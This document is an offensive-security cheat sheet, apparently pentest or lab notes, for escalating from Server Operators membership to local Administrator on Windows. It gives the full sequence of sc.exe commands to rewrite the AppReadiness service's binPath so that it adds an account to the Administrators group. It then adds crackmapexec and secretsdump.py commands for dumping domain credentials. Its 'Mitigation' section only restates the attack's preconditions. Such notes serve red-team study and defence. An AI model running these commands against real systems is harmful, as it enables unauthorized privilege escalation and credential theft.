# **Exploiting Server Operators via Service Modification**

## **Key Concepts**

* **Service Permissions**

  * Members of **Server Operators** have **SERVICE_ALL_ACCESS** over many services.
  * This allows **reconfiguring service binaries**, starting/stopping services, and replacing executables.

* **Service Modification**

  * Abuse a writable service (e.g., **AppReadiness**) by changing the `binPath` to run arbitrary commands.

* **Privilege Escalation**

  * Replace the service binary with a command that adds the attacker to **Local Administrators** - full control.

---

# **Approach, Commands, Tools, and Techniques**

## **1. Enumerate Service Configuration**

```cmd
sc qc AppReadiness
```

## **2. Check Effective Permissions**

```cmd
PsService.exe security AppReadiness
```

*Confirm `SERVICE_ALL_ACCESS` or similar rights for your user (via Server Operators).*

## **3. Check Local Admin Group Membership**

```cmd
net localgroup Administrators
```

## **4. Modify Service Binary Path (Privilege Escalation)**

```cmd
sc config AppReadiness binPath= "cmd /c net localgroup Administrators server_adm /add"
```

## **5. Trigger the Modified Service**

```cmd
sc start AppReadiness
```

## **6. Verify Admin Access**

```cmd
net localgroup Administrators
```

---

# **Post-Exploitation**

### **Validate Local Administrator Access**

```bash
crackmapexec smb <target_ip> -u <user> -p <password>
```

### **Dump NTDS / Credentials (If DC or Access to One)**

```bash
secretsdump.py <user>@<target_ip> -just-dc-user administrator
```

---

# **Commands Used**

* `sc qc`
* `sc config`
* `sc start`
* `net localgroup Administrators`
* `PsService.exe`
* `crackmapexec smb`
* `secretsdump.py`

---

# **Tools**

* **sc.exe** (native)
* **PsService.exe** (Sysinternals)
* **CrackMapExec**
* **Impacket (secretsdump.py)**

---

# **Techniques**

* Abusing **SERVICE_ALL_ACCESS** via Server Operators.
* Overwriting the **binPath** to execute arbitrary commands.
* Elevating to Local Administrator by modifying service configurations.
* Conducting post-exploitation via Impacket tooling.

---

# **Mitigation**

* The service must allow configuration changes (many do).
* The account must have **Server Operators** privileges.
* Ensure the service auto-restores its original configuration after testing if required.
* Once Local Admin - full post-exploitation options available.
